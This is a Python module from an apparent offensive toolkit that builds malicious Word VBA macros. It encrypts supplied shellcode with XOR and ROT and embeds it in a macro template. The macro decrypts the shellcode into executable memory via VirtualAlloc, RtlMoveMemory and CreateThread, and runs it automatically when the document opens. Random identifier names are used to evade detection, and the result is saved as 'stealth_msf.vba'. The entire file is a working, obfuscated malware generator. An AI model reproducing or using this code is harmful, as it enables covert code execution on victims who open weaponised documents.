import os
import random
import string
from ..core.utils import console

def xor_rot_encrypt(data, xor_key, rot_shift):
    encrypted = bytearray()
    key_len = len(xor_key)
    for i in range(len(data)):
        # XOR
        val = data[i] ^ xor_key[i % key_len]
        # ROT
        val = (val + rot_shift) % 256
        encrypted.append(val)
    return encrypted

def generate_random_name(length=8):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def format_vba_chunks(var_name, data, chunk_size=50):
    """
    Assigns the data to the variable in small chunks to avoid VBA compiler limits.
    """
    str_data = [str(b) for b in data]
    lines = []
    for i in range(0, len(str_data), chunk_size):
        chunk = ",".join(str_data[i:i + chunk_size])
        if i == 0:
            lines.append(f'{var_name} = "{chunk}"')
        else:
            # Add leading comma if not the first chunk
            lines.append(f'{var_name} = {var_name} & ",{chunk}"')
    return "\n    ".join(lines)

VBA_TEMPLATE = """
#If VBA7 Then
    Private Declare PtrSafe Function {api_alloc} Lib "kernel32" Alias "VirtualAlloc" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Sub {api_move} Lib "kernel32" Alias "RtlMoveMemory" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long)
    Private Declare PtrSafe Function {api_thread} Lib "kernel32" Alias "CreateThread" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ByVal ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
#Else
    Private Declare Function {api_alloc} Lib "kernel32" Alias "VirtualAlloc" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
    Private Declare Sub {api_move} Lib "kernel32" Alias "RtlMoveMemory" (ByVal lDestination As Long, ByRef sSource As Any, ByVal lLength As Long)
    Private Declare Function {api_thread} Lib "kernel32" Alias "CreateThread" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As Long, ByVal ThreadParameter As Long, ByVal CreateFlags As Long, ByRef ThreadId As Long) As Long
#End If

Function {func_decrypt}({var_data} As String) As Byte()
    Dim {var_key} As Variant
    Dim {var_res}() As Byte
    Dim {var_i} As Long
    Dim {var_val} As Integer
    Dim {var_split} As Variant
    
    {var_key} = Array({xor_key_vba})
    {var_split} = Split({var_data}, ",")
    ReDim {var_res}(UBound({var_split}))
    
    For {var_i} = LBound({var_split}) To UBound({var_split})
        {var_val} = CInt({var_split}({var_i}))
        ' ROT Decrypt
        {var_val} = {var_val} - {rot_shift}
        If {var_val} < 0 Then {var_val} = {var_val} + 256
        ' XOR Decrypt
        {var_res}({var_i}) = CByte({var_val} Xor {var_key}({var_i} Mod (UBound({var_key}) + 1)))
    Next {var_i}
    {func_decrypt} = {var_res}
End Function

Sub {func_main}()
    Dim {var_raw} As String
    Dim {var_shellcode}() As Byte
    #If VBA7 Then
        Dim {var_addr} As LongPtr
        Dim {var_res} As LongPtr
    #Else
        Dim {var_addr} As Long
        Dim {var_res} As Long
    #End If
    Dim {var_tid} As Long
    Dim {var_i} As Long

    {chunked_assignments}
    
    {var_shellcode} = {func_decrypt}({var_raw})

    {var_addr} = {api_alloc}(0, UBound({var_shellcode}) + 1, &H3000, &H40)
    
    For {var_i} = LBound({var_shellcode}) To UBound({var_shellcode})
        {api_move} {var_addr} + {var_i}, {var_shellcode}({var_i}), 1
    Next {var_i}
    
    {var_res} = {api_thread}(0, 0, {var_addr}, 0, 0, {var_tid})
End Sub

Sub Document_Open()
    {func_main}
End Sub

Sub AutoOpen()
    {func_main}
End Sub
"""

def generate(shellcode, output_dir):
    # Setup Encryption
    xor_key = [random.randint(1, 255) for _ in range(16)]
    rot_shift = random.randint(1, 100)
    
    encrypted = xor_rot_encrypt(shellcode, xor_key, rot_shift)
    
    # Randomize Names
    var_raw = generate_random_name()
    names = {
        "api_alloc": generate_random_name(),
        "api_move": generate_random_name(),
        "api_thread": generate_random_name(),
        "func_decrypt": generate_random_name(),
        "func_main": generate_random_name(),
        "var_data": generate_random_name(),
        "var_key": generate_random_name(),
        "var_res": generate_random_name(),
        "var_i": generate_random_name(),
        "var_val": generate_random_name(),
        "var_raw": var_raw,
        "var_shellcode": generate_random_name(),
        "var_addr": generate_random_name(),
        "var_tid": generate_random_name(),
        "var_split": generate_random_name(),
        "xor_key_vba": ", ".join(map(str, xor_key)),
        "rot_shift": rot_shift
    }
    
    # Generate the chunked string assignments
    names["chunked_assignments"] = format_vba_chunks(var_raw, encrypted)
    
    output = VBA_TEMPLATE.format(**names)
    
    output_file = os.path.join(output_dir, "stealth_msf.vba")
    with open(output_file, "w") as f:
        f.write(output)
        
    console.print(f"[bold green][+] Success! Stealth VBA Macro saved to: [bold white]{output_file}[/bold white][/bold green]")
    return output_file
